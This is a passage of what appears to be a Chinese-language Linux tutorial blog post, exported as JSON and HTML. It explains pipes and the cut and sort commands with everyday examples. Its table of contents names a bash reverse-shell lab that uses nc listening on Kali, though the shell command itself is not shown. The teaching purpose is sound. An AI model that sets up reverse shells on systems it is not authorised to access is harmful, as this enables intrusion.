title=\"为什么管道如此重要和强大？\"></a>为什么管道如此重要和强大？</h3><ol>\n<li><strong>模块化：</strong> 将大而复杂的问题分解成一系列小而简单、职责单一的命令。</li>\n<li><strong>可复用：</strong> 那些单一功能的命令（如 <code>grep</code>, <code>sort</code>, <code>awk</code>）可以被无数个不同的管道在不同的上下文中重用。</li>\n<li><strong>效率高：</strong> 省去了创建临时文件的步骤，直接在内存中传递数据，速度更快。</li>\n<li><strong>表达能力丰富：</strong> 通过组合简单的命令，可以构造出极其强大的数据处理流水线，完成很多复杂的文本或数据处理任务。</li>\n<li><strong>命令行效率：</strong> 熟练掌握管道是高效使用 Linux&#x2F;Unix 命令行的关键标志。</li>\n</ol>\n<h3 id=\"经典使用示例：\"><a href=\"#经典使用示例：\" class=\"headerlink\" title=\"经典使用示例：\"></a>经典使用示例：</h3><ol>\n<li><p><strong>查找并计数：</strong> 在当前目录及其子目录下查找所有包含 “error” 的 <code>.log</code> 文件，并统计出现次数：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">grep -r <span class=\"string\">&quot;error&quot;</span> *.<span class=\"built_in\">log</span> | <span class=\"built_in\">wc</span> -l</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><code>grep -r &quot;error&quot; *.log</code>: 递归查找 <code>.log</code> 文件中的 “error” 行（输出多行文本）。</li>\n<li><code>|</code>: 将 <code>grep</code> 的输出传给 <code>wc</code>。</li>\n<li><code>wc -l</code>: 统计接收到的输入的行数（即包含 “error” 的行数）。</li>\n</ul>\n</li>\n<li><p><strong>列出、排序、去重：</strong> 列出 <code>/etc</code> 目录下的文件（不包括隐藏文件），按名称排序，并显示唯一的扩展名：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">ls</span> /etc | grep -v <span class=\"string\">&quot;^\\\\.&quot;</span> | <span class=\"built_in\">sort</span> | <span class=\"built_in\">cut</span> -d <span class=\"string\">&#x27;.&#x27;</span> -f 2- | <span class=\"built_in\">uniq</span></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><code>ls /etc</code>: 列出 <code>/etc</code> 下的文件和目录（输出多行文本）。</li>\n<li><code>grep -v &quot;^\\.&quot;</code>: 过滤掉以 <code>.</code> 开头的行（排除隐藏文件，不完美但对简单示例有效）。</li>\n<li><code>sort</code>: 对文件名按字母顺序排序（为 <code>uniq</code> 准备）。</li>\n<li><code>cut -d &#39;.&#39; -f 2-</code>: 以 <code>.</code> 为分隔符，提取文件名中第一个 <code>.</code> 之后的部分（扩展名）。<code>-f 2-</code> 表示从第二个字段到最后一个字段。</li>\n<li><code>uniq</code>: 只显示排序后列表中唯一的行（去除重复扩展名）。</li>\n</ul>\n</li>\n<li><p><strong>查看长列表分页：</strong> 列出 <code>/usr/bin</code> 目录的详细信息，并用 <code>less</code> 分页查看：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">ls</span> -l /usr/bin | less</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><code>ls -l /usr/bin</code>: 产生长格式列表。</li>\n<li><code>| less</code>: 将长输出传递给 <code>less</code>，方便分页、搜索和滚动浏览。</li>\n</ul>\n</li>\n<li><p><strong>监控日志：</strong> 实时监控日志文件，只显示包含 “Failed” 的行：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">tail</span> -f /var/log/syslog | grep <span class=\"string\">&quot;Failed&quot;</span></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><code>tail -f /var/log/syslog</code>: 持续输出文件尾部新增的内容（实时追踪）。</li>\n<li><code>| grep &quot;Failed&quot;</code>: 只将包含 “Failed” 的行显示在屏幕上。</li>\n</ul>\n</li>\n</ol>\n<h3 id=\"需要注意：\"><a href=\"#需要注意：\" class=\"headerlink\" title=\"需要注意：\"></a>需要注意：</h3><ul>\n<li><strong>错误流：</strong> 默认管道只处理标准输出。如果左侧命令产生大量错误信息（stderr），它们会混在终端输出中。如要重定向错误流到管道，需要用 <code>2&gt;&amp;1</code> (将 stderr 合并到 stdout)，或者重定向错误到其他地方。</li>\n<li><strong>只处理文本：</strong> 管道传递的是文本流。命令需要理解文本格式。二进制数据通常不适合管道处理（虽然也能传，但接收命令要能解析）。</li>\n<li><strong>效率：</strong> 极其长的管道或多级管道可能效率不高，因为涉及多次程序启动和上下文切换。对于复杂数据处理，专用脚本语言（如 Python, Perl）或工具（如 <code>awk</code> 本身可以处理较复杂的逻辑）可能更高效。</li>\n<li><strong>命名管道：</strong> 除了临时管道（匿名管道，用 <code>|</code> 创建），还有 <strong>命名管道（FIFO, First-In-First-Out）</strong>，它是一个存在于文件系统的特殊文件，可以作为进程间通信的持久化通道（创建用 <code>mkfifo</code>）。</li>\n</ul>\n<p>好的，<code>cut</code> 和 <code>sort</code> 都是 Linux&#x2F;Unix 命令行中极其常用且强大的<strong>文本处理工具</strong>。它们常被用于管道 (<code>|</code>) 中，相互配合或与其他命令一起完成数据处理任务。</p>\n<p>让我们分别深入了解它们：</p>\n<h3 id=\"cut：纵向剪切-提取文本的特定部分\"><a href=\"#cut：纵向剪切-提取文本的特定部分\" class=\"headerlink\" title=\"cut：纵向剪切 - 提取文本的特定部分\"></a><code>cut</code>：纵向剪切 - 提取文本的特定部分</h3><ul>\n<li><strong>核心功能：</strong> 从输入行（通常是文件或管道传入的数据流）中，<strong>按列或按字段</strong>提取指定的部分（字节、字符、字段）。</li>\n<li><strong>核心哲学：</strong> 用于<strong>垂直</strong>（按列&#x2F;字段）地切割文本行。</li>\n<li><strong>常用选项：</strong><ul>\n<li><code>-d DELIMITER</code> (或 <code>--delimiter=DELIMITER</code>)：指定<strong>字段分隔符</strong>。<strong>这是使用 <code>-f</code> 选项的关键前提！</strong> 默认分隔符是制表符 (<code>\\t</code>)，但最常见的可能是空格或逗号（如 CSV 文件）。</li>\n<li><code>-f FIELDS</code>(或 <code>--fields=FIELDS</code>)：指定要提取哪些字段（列）。字段编号从 1 开始。<ul>\n<li>可以是单个数字：<code>-f 3</code> (提取第3个字段)</li>\n<li>可以是用逗号分隔的多个数字：<code>-f 1,3</code> (提取第1和第3个字段)</li>\n<li>可以是一个范围：<code>-f 1-3</code> (提取第1到第3个字段)</li>\n<li>也可以是混合：<code>-f 1,3-5,7</code> (提取1, 3到5, 7)</li>\n</ul>\n</li>\n<li><code>-c CHARACTERS</code> (或 <code>--characters=CHARACTERS</code>)：指定要提取哪些字符（或字节）位置（按位置，不依赖分隔符）。<ul>\n<li>格式同 <code>-f</code>：<code>-c 10</code> (第10个字符)， <code>-c 5-10</code> (5到10个字符), <code>-c 1,3,5-7</code> (1,3,5到7)</li>\n</ul>\n</li>\n<li><code>-b BYTES</code> (或 <code>--bytes=BYTES</code>)：类似 <code>-c</code>，但指定的是<strong>字节位置</strong>而不是字符位置（在纯 ASCII 文本中两者相同，但在包含多字节字符如 UTF-8 的文件中，<code>-c</code> 会正确处理字符，<code>-b</code> 则按字节切割可能切碎字符）。</li>\n</ul>\n</li>\n<li><strong>工作原理：</strong><ul>\n<li>对于每一行输入文本：</li>\n<li><strong>使用 <code>-d</code> 和 <code>-f</code>:</strong> <code>cut</code> 会根据指定的分隔符 (<code>-d</code>) 将行分割成多个<strong>字段</strong>，然后只输出指定的字段编号 (<code>-f</code>)。</li>\n<li><strong>使用 <code>-c</code> 或 <code>-b</code>:</strong> <code>cut</code> 会直接按照指定的字符或字节位置提取。</li>\n</ul>\n</li>\n<li><strong>经典用法与示例：</strong><ul>\n<li><strong>提取 CSV 文件的特定列：</strong> <code>cut -d&#39;,&#39; -f 1,4 employees.csv</code> (假设员工 CSV 文件，以逗号分隔，提取姓名和工资列)。</li>\n<li><strong>提取系统用户名 (<code>/etc/passwd</code>):</strong> <code>/etc/passwd</code> 文件以冒号 <code>:</code> 分隔，第一列是用户名：<br> <code>cut -d&#39;:&#39; -f 1 /etc/passwd</code> (输出所有用户名)</li>\n<li><strong>提取日志文件中的特定部分：</strong> 假设日志每行以空格分隔，第 5 列是 IP 地址：<br> <code>grep &quot;error&quot; application.log | cut -d&#39; &#39; -f 5</code></li>\n<li><strong>提取固定宽度数据的列：</strong> 有时数据排列整齐但没用分隔符：<br> <code>ls -l | cut -c 1-10,48-</code> (提取权限字段和文件名)</li>\n<li><strong>提取每行的前 N 个字符：</strong> <code>cut -c 1-10 somefile.txt</code></li>\n</ul>\n</li>\n<li><strong>重要注意点：</strong><ul>\n<li><strong>分隔符陷阱：</strong> <code>cut</code> 对于<strong>连续的分隔符</strong>处理方式简单。如果一行中出现连续的分隔符（如两个空格），<code>cut -f</code> 可能会将空字段也算在内。这在使用空格分隔时尤其常见（因为单词间的空格数量可能不固定）。<code>awk</code> 在处理这类情况时通常更灵活（它会将连续空格视为一个分隔符）。</li>\n<li><strong>字段顺序：</strong> 使用 <code>-f</code> 时，字段按编号顺序输出，<strong>顺序由 <code>-f</code> 参数指定</strong>。<code>cut -f 3,1</code> 会先输出第3个字段，再输出第1个字段。</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"sort：横向排序-按行排序文本\"><a href=\"#sort：横向排序-按行排序文本\" class=\"headerlink\" title=\"sort：横向排序 - 按行排序文本\"></a><code>sort</code>：横向排序 - 按行排序文本</h3><ul>\n<li><p><strong>核心功能：</strong> 读取输入行（文件或管道），对它们进行<strong>排序</strong>（默认为按整行的字符串字典序升序排列），然后输出排序后的结果。</p>\n</li>\n<li><p><strong>核心哲学：</strong> 用于<strong>水平</strong>（整行）地对文本块进行排序或重组。</p>\n</li>\n<li><p><strong>强大之处：</strong> 不仅仅能按整行排序，还能按特定字段、数值大小、日期、忽略大小写等复杂规则排序。</p>\n</li>\n<li><p><strong>常用选项：</strong></p>\n<ul>\n<li><p><code>-r</code> (或 <code>--reverse</code>)：<strong>反向排序</strong>（降序）。</p>\n</li>\n<li><p><code>-n</code> (或 <code>--numeric-sort</code>)：<strong>按数值排序</strong>。对于包含数字的字段非常关键！默认排序是按字符串的字典序（”10” 会排在 “2” 前面，因为 ‘1’ &lt; ‘2’），使用 <code>-n</code> 会将字段解释为数字来排序（”2” &lt; “10”）。</p>\n</li>\n<li><p><code>-k KEYDEF</code> (或 <code>--key=KEYDEF</code>)：指定排序键（排序依据的关键部分）。这是最灵活、最强大的选项。<code>KEYDEF</code>的格式通常为 </p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[F[.C][OPTS]][, [F[.C][OPTS]]]</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><code>F</code>：字段编号（从 <strong>1</strong> 开始）。</li>\n<li><code>.C</code>：从字段的第 <strong>C 个字符</strong>开始比较（字段的第一个字符是 <strong>1</strong>）。<code>.C</code> 可选，如果省略则从字段的第一个字符开始比较。</li>\n<li><code>OPTS</code>：一个或多个排序选项字母（如 <code>n</code> - 数值， <code>r</code> - 反向， <code>d</code> - 字典序， <code>i</code> - 忽略不可打印字符， <code>f</code> - 忽略大小写等）。这些选项 <strong>仅应用于此键</strong>。</li>\n<li>可以指定多个 <code>-k</code> 选项或多个键定义。排序时先按第一个键排序，若第一个键相等再按第二个键排序，以此类推。</li>\n<li>示例：<ul>\n<li><code>sort -k2,2n</code>：按第二个字段（作为数值）排序。</li>\n<li><code>sort -k1,1f -k3,3rn</code>：首先按第一个字段排序（忽略大小写），如果第一个字段相同，则按第三个字段排序（作为数值，降序）。</li>\n<li><code>sort -k3.2</code>：按第三个字段的第<strong>二个字符</strong>开始排序（直到行尾或下一个键定义的开始）。</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p><code>-t DELIMITER</code> (或 <code>--field-separator=DELIMITER</code>)：指定用于区分字段的分隔符，<strong>必须与 <code>-k</code> 选项配合使用</strong>。默认是空格，但常需要指定（如处理 CSV 或 <code>/etc/passwd</code>）。</p>\n</li>\n<li><p><code>-u</code> (或 <code>--unique</code>)：<strong>排序并去重</strong>（相当于 <code>sort | uniq</code>，但效率通常更高）。</p>\n</li>\n<li><p><code>-f</code> (或 <code>--ignore-case</code>)：排序时<strong>忽略大小写</strong>。</p>\n</li>\n<li><p><code>-o FILE</code> (或 <code>--output=FILE</code>)：将排序结果<strong>输出到文件</strong>（可以覆盖原文件）。优于使用 <code>sort file &gt; file</code>，因为后者可能会导致文件截断为空后读取。</p>\n</li>\n<li><p><code>-b</code> (或 <code>--ignore-leading-blanks</code>)：在比较字段时，<strong>忽略开头的空白字符</strong>（空格、制表符）。</p>\n</li>\n</ul>\n</li>\n<li><p><strong>经典用法与示例：</strong></p>\n<ul>\n<li><p><strong>按字母顺序排序单词列表：</strong> </p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">sort</span> wordlist.txt</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><strong>按数字降序排序：</strong></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">du</span> -sh * | <span class=\"built_in\">sort</span> -hr</span><br></pre></td></tr></table></figure>\n\n<p>（常用组合：<code>du -sh *</code>显示目录大小，<code>sort -h</code> 按人类可读格式排序 KiB, MiB 等）。</p>\n<ul>\n<li><em>注意：</em> <code>-h</code> (human-readable) 选项是 GNU sort 的扩展，不是所有系统都有。在 macOS (BSD) 上需要用其他方式。</li>\n</ul>\n</li>\n<li><p><strong>按特定字段排序文件：</strong> 处理 <code>/etc/passwd</code> (冒号分隔)，按用户 ID (第三字段, 数字) 排序：<br> <code>sort -t&#39;:&#39; -k3n /etc/passwd</code></p>\n</li>\n<li><p><strong>多级排序：</strong> 处理员工 CSV (逗号分隔)：先按部门 (第2列) 升序排，相同部门内按工资 (第4列, 数值) 降序排：<br> <code>sort -t&#39;,&#39; -k2,2 -k4,4rn employees.csv</code></p>\n</li>\n<li><p><strong>排序并去重：</strong> <code>sort -u usernames.txt</code></p>\n</li>\n<li><p><strong>忽略大小写排序：</strong> <code>sort -f mixed_case.txt</code></p>\n</li>\n<li><p><strong>安全地覆盖原文件排序：</strong> <code>sort input.txt -o input.txt</code></p>\n</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"cut-与-sort-的黄金组合\"><a href=\"#cut-与-sort-的黄金组合\" class=\"headerlink\" title=\"cut 与 sort 的黄金组合\"></a><code>cut</code> 与 <code>sort</code> 的黄金组合</h3><p>这两个命令经常在管道中协同工作：</p>\n<ol>\n<li><p><strong>流程：</strong> 通常是 <strong><code>cut</code></strong> 用来 <strong>提取</strong> 需要排序的关键列 -&gt; <strong><code>sort</code></strong> 对这些提取出来的列或数据行进行<strong>排序</strong> -&gt; 可能再用其他命令处理排序结果。</p>\n</li>\n<li><p>示例：</p>\n<p><strong>找出最常用的命令</strong>：提取 history 输出的命令部分（忽略行号），排序、计数、再排序：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">history</span> | <span class=\"built_in\">cut</span> -c 8- | <span class=\"built_in\">sort</span> | <span class=\"built_in\">uniq</span> -c | <span class=\"built_in\">sort</span> -nr | <span class=\"built_in\">head</span> -10</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><code>history</code>：列出命令历史记录。</li>\n<li><code>cut -c 8-</code>：移除每行开头的行号 (通常前 7 字符是行号加空格)。</li>\n<li><code>sort</code>：按命令名字母排序（为 <code>uniq -c</code> 做准备）。</li>\n<li><code>uniq -c</code>：统计每个<strong>连续</strong>出现的命令的次数（排序后连续的相同命令才会被统计）。</li>\n<li><code>sort -nr</code>：按统计的次数（数值，格式 <code>次数 命令名</code>）降序排序（次数最大的排在最前）。</li>\n<li><code>head -10</code>：显示前 10 个结果。</li>\n</ul>\n<p><strong>按特定列排序日志</strong>：从日志文件中提取第5列（假设是耗时）并按数值降序排，找出耗时最长的请求：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">grep &quot;Completed&quot; app.log | cut -d&#x27; &#x27; -f 5 | sort -nr | head -1</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><code>grep &quot;Completed&quot;</code>：筛选出包含 “Completed” 的行。</li>\n<li><code>cut -d&#39; &#39; -f 5</code>：提取以空格分隔的第 5 个字段（耗时）。</li>\n<li><code>sort -nr</code>：按数值降序排序。</li>\n<li><code>head -1</code>：显示排在最上面的那个耗时（最大值）。</li>\n</ul>\n<p><strong>处理 CSV</strong>：提取 CSV 的名字列和销售额列，按销售额降序排：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cut -d&#x27;,&#x27; -f 1,4 sales.csv | sort -t&#x27;,&#x27; -k2,2rn</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><code>cut -d&#39;,&#39; -f 1,4</code>：提取第一列（名字）和第四列（销售额）。</li>\n<li><code>sort -t&#39;,&#39; -k2,2rn</code>：按第二个字段（销售额）降序排列（数值）。分隔符必须再次指定为逗号 (<code>-t&#39;,&#39;</code>)。</li>\n</ul>\n</li>\n</ol>\n<h3 id=\"总结：\"><a href=\"#总结：\" class=\"headerlink\" title=\"总结：\"></a>总结：</h3><p>管道 <code>|</code> 是 Linux&#x2F;Unix 命令行的核心支柱之一，它体现了”组合小工具完成大任务”的哲学。通过它，你可以将多个简单、专注的命令无缝连接起来，构建出高效的数据处理流水线。掌握管道的使用是提升命令行熟练度和解决问题效率的关键步骤。在 2025 年的今天，它依然是系统管理员、开发者和数据科学家的日常必备工具。</p>\n<p><strong><code>cut</code>:</strong> 是你的“纵向剪刀”✂️，专注于<strong>提取行中的特定列或字段</strong>。记住 <code>-d</code>（分隔符）和 <code>-f</code>（字段编号）是黄金搭档；<code>-c</code>&#x2F;<code>-b</code> 用于直接按位置剪切。</p>\n<p><strong><code>sort</code>:</strong> 是你的“横向排序器”🔃，专注于<strong>对整行或基于特定字段对行进行排序</strong>。记住 <code>-k</code>（指定排序键）和 <code>-n</code>（数值排序）的威力，<code>-t</code> 用于指定字段分隔符（与 <code>-k</code> 配合），<code>-r</code> 用于倒序。</p>\n<p><strong>黄金组合：</strong> 非常自然地在管道 (<code>|</code>) 中连续使用：先 <code>cut</code> 精确定位数据，再 <code>sort</code> 对数据进行排列组合。它们与 <code>grep</code>, <code>uniq</code>, <code>awk</code>, <code>wc</code> 等共同构成了 Unix&#x2F;Linux 文本处理流水线的基石。熟练掌握这两个命令及其组合应用，会让你在命令行下的数据处理能力突飞猛进。</p>\n","text":"重定向和管道一、重定向1.文件描述符（FD）定义：在 Linux 中，文件描述符（File Descriptor）是一个非负整数，用于唯一标识一个进程（程序） ...","permalink":"/post/重定向和管道","photos":[],"count_time":{"symbolsCount":"14k","symbolsTime":"13 mins."},"categories":[],"tags":[{"name":"Linux","slug":"Linux","count":13,"path":"api/tags/Linux.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E9%87%8D%E5%AE%9A%E5%90%91%E5%92%8C%E7%AE%A1%E9%81%93\"><span class=\"toc-text\">重定向和管道</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%B8%80%E3%80%81%E9%87%8D%E5%AE%9A%E5%90%91\"><span class=\"toc-text\">一、重定向</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#1-%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%EF%BC%88FD%EF%BC%89\"><span class=\"toc-text\">1.文件描述符（FD）</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#2-%E6%A0%87%E5%87%86%E8%BE%93%E5%85%A5%E3%80%81%E6%A0%87%E5%87%86%E8%BE%93%E5%87%BA%E3%80%81%E6%A0%87%E5%87%86%E9%94%99%E8%AF%AF%E8%BE%93%E5%87%BA\"><span class=\"toc-text\">2.标准输入、标准输出、标准错误输出</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#3-%E6%80%BB%E7%BB%93\"><span class=\"toc-text\">3.总结</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#4-%E9%87%8D%E5%AE%9A%E5%90%91%E7%BB%83%E4%B9%A0\"><span class=\"toc-text\">4.重定向练习</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#1-%E8%BE%93%E5%87%BA%E9%87%8D%E5%AE%9A%E5%90%91%E5%8F%8A%E7%BB%BC%E5%90%88%E6%A1%88%E4%BE%8B\"><span class=\"toc-text\">1.输出重定向及综合案例</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E6%A1%88%E4%BE%8B1%EF%BC%9A%E8%BE%93%E5%87%BA%E9%87%8D%E5%AE%9A%E5%90%91\"><span class=\"toc-text\">案例1：输出重定向</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E6%A1%88%E4%BE%8B2%EF%BC%9A%E9%94%99%E8%AF%AF%E8%BE%93%E5%87%BA%E9%87%8D%E5%AE%9A%E5%90%91\"><span class=\"toc-text\">案例2：错误输出重定向</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E6%A1%88%E4%BE%8B3%EF%BC%9A-%E6%AD%A3%E7%A1%AE%E5%92%8C%E9%94%99%E8%AF%AF%E9%83%BD%E8%BE%93%E5%85%A5%E5%88%B0%E7%9B%B8%E5%90%8C%E4%BD%8D%E7%BD%AE\"><span class=\"toc-text\">案例3： 正确和错误都输入到相同位置</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E6%A1%88%E4%BE%8B4%EF%BC%9A%E5%B0%86-stdout-%E5%92%8C-stderr-%E5%88%86%E5%88%AB%E9%87%8D%E5%AE%9A%E5%90%91%E5%88%B0%E4%B8%8D%E5%90%8C%E6%96%87%E4%BB%B6\"><span class=\"toc-text\">案例4：将 stdout 和 stderr 分别重定向到不同文件</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E6%A1%88%E4%BE%8B5%EF%BC%9A%E5%B0%86-stderr-%E5%90%88%E5%B9%B6%E5%88%B0-stdout%EF%BC%8C%E5%86%8D%E4%B8%80%E8%B5%B7%E9%87%8D%E5%AE%9A%E5%90%91%E5%88%B0%E6%96%87%E4%BB%B6\"><span class=\"toc-text\">案例5：将 stderr 合并到 stdout，再一起重定向到文件</span></a></li></ol></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#2-%E8%BE%93%E5%85%A5%E9%87%8D%E5%AE%9A%E5%90%91%E5%8F%8A%E7%BB%93%E5%90%88%E6%A1%88%E4%BE%8B\"><span class=\"toc-text\">2.输入重定向及结合案例</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E6%A1%88%E4%BE%8B%EF%BC%9A%E5%88%A9%E7%94%A8-cat-%E5%B0%86%E8%BE%93%E5%85%A5%E6%96%87%E5%AD%97%E8%BE%93%E5%87%BA%E5%88%B0-catfile-%E4%B8%AD%EF%BC%8C-%E5%BD%93%E8%BE%93%E5%85%A5-eof-%E6%97%B6%E5%B0%B1%E7%BB%93%E6%9D%9F\"><span class=\"toc-text\">案例：利用 cat 将输入文字输出到 catfile 中， 当输入 eof 时就结束</span></a></li></ol></li></ol></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%BA%8C%E3%80%81bash%E5%8F%8D%E5%BC%B9shell\"><span class=\"toc-text\">二、bash反弹shell</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#1-%E4%BB%80%E4%B9%88%E6%98%AF%E5%86%85%E6%A0%B8%EF%BC%88kernel\"><span class=\"toc-text\">1.什么是内核（kernel)</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#2-%E4%BB%80%E4%B9%88%E6%98%AFshell-GNU-GNU-NOT-UNIX\"><span class=\"toc-text\">2.什么是shell GNU &#x3D; GNU NOT UNIX</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#3-%E4%BB%80%E4%B9%88%E6%98%AFbash\"><span class=\"toc-text\">3.什么是bash</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#4-%E4%B8%89%E8%80%85%E7%9A%84%E5%85%B3%E7%B3%BB\"><span class=\"toc-text\">4.三者的关系</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#5-bash%E5%8F%8D%E5%BC%B9shell\"><span class=\"toc-text\">5.bash反弹shell</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#6-%E5%AE%9E%E9%AA%8C\"><span class=\"toc-text\">6.实验</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#1-%E5%BC%80%E5%90%AFkali-%E4%BD%BF%E7%94%A8nc%E5%B7%A5%E5%85%B7%E7%9B%91%E5%90%AC1234%E7%AB%AF%E5%8F%A3\"><span class=\"toc-text\">1.开启kali,使用nc工具监听1234端口</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#2-%E5%9C%A8Centos%E4%B8%AD%EF%BC%8C%E6%89%A7%E8%A1%8C%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%91%BD%E4%BB%A4\"><span class=\"toc-text\">2.在Centos中，执行反弹shell的命令</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#3-%E5%9C%A8Centos%E4%B8%AD%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%EF%BC%8C%E7%BB%93%E6%9E%9C%E8%BE%93%E5%87%BA%E5%88%B0kali%E4%B8%AD\"><span class=\"toc-text\">3.在Centos中执行命令，结果输出到kali中</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%B8%89%E3%80%81%E7%AE%A1%E9%81%93\"><span class=\"toc-text\">三、管道</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%A0%B8%E5%BF%83%E6%A6%82%E5%BF%B5%EF%BC%9A\"><span class=\"toc-text\">核心概念：</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%A6%82%E4%BD%95%E8%A1%A8%E7%A4%BA%E5%92%8C%E4%BD%BF%E7%94%A8%EF%BC%9A\"><span class=\"toc-text\">如何表示和使用：</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%85%B3%E9%94%AE%E7%89%B9%E6%80%A7%E4%B8%8E%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86%EF%BC%9A\"><span class=\"toc-text\">关键特性与工作原理：</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E4%B8%BA%E4%BB%80%E4%B9%88%E7%AE%A1%E9%81%93%E5%A6%82%E6%AD%A4%E9%87%8D%E8%A6%81%E5%92%8C%E5%BC%BA%E5%A4%A7%EF%BC%9F\"><span class=\"toc-text\">为什么管道如此重要和强大？</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%BB%8F%E5%85%B8%E4%BD%BF%E7%94%A8%E7%A4%BA%E4%BE%8B%EF%BC%9A\"><span class=\"toc-text\">经典使用示例：</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E9%9C%80%E8%A6%81%E6%B3%A8%E6%84%8F%EF%BC%9A\"><span class=\"toc-text\">需要注意：</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#cut%EF%BC%9A%E7%BA%B5%E5%90%91%E5%89%AA%E5%88%87-%E6%8F%90%E5%8F%96%E6%96%87%E6%9C%AC%E7%9A%84%E7%89%B9%E5%AE%9A%E9%83%A8%E5%88%86\"><span class=\"toc-text\">cut：纵向剪切 - 提取文本的特定部分</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#sort%EF%BC%9A%E6%A8%AA%E5%90%91%E6%8E%92%E5%BA%8F-%E6%8C%89%E8%A1%8C%E6%8E%92%E5%BA%8F%E6%96%87%E6%9C%AC\"><span class=\"toc-text\">sort：横向排序 - 按行排序文本</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#cut-%E4%B8%8E-sort-%E7%9A%84%E9%BB%84%E9%87%91%E7%BB%84%E5%90%88\"><span class=\"toc-text\">cut 与 sort 的黄金组合</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%80%BB%E7%BB%93%EF%BC%9A\"><span 